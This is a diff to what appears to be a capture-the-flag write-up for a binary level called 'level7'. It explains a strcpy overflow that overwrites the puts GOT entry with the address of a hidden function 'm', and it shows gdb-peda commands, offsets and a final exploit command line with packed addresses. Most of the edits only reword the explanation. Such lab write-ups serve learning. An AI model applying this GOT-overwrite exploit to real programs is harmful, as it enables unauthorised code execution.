@@ -137,17 +137,17 @@ There is a non-called "m" function
 	   0x08048520 <+44>:	ret
 	End of assembler dump.
 
-Printf the time and a global variable "0x8049960"
+Printf the time and a global variable "0x8049960", the name is "c"
 
-fgets put the result of the fopen on a global string "0x8049960", the same of the printf
+fgets put the result of the fopen on a global string "c", the same of the printf
 
 We need to read this global variable by calling the function m
 
-We can overwrite the puts call by "m" in the GOT table using the strcpy overflow
+We can overwrite the puts call by "m" in the GOT using the strcpy overflow
 
 *********************************
 
-Get the address of puts in the GOT table
+Get the address of puts in the GOT
 
 gdb-peda$ info function puts
 All functions matching regular expression "puts":
@@ -173,7 +173,7 @@ The address is "0x08049928"
 
 The address is "0x080484f4"
 
-Get the offset of the first strcpy overflow
+Get the offset of the first strcpy overflow, with the gdb-peda pattern tool for do it faster
 
 	(gdb-peda)$ pattern create 50 file
 
@@ -193,11 +193,11 @@ The offset is 20
 
 With the first argument overflow, we can inject the puts GOT address on the second argument address
 
-argv[1] = 20, if we inject more, we overwrite argv[2], with the puts GOT address in this case
+argv[1] = 20, if we inject more, we replace the argv[2] address, with the puts GOT address in this case
 
-Finaly, in the second argument, we just pass the address of "m" for replace the puts call
+Finaly, in the second argument, just fill the puts GOT address with the address we want! The address of m
 
 	argv[1] = "a" * 20 + "puts GOT addr"
-	argv[2] = "m addr"
+	argv[2] -> puts GOT addr = "m addr"
 
 	./level7 $(python -c 'print "a"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
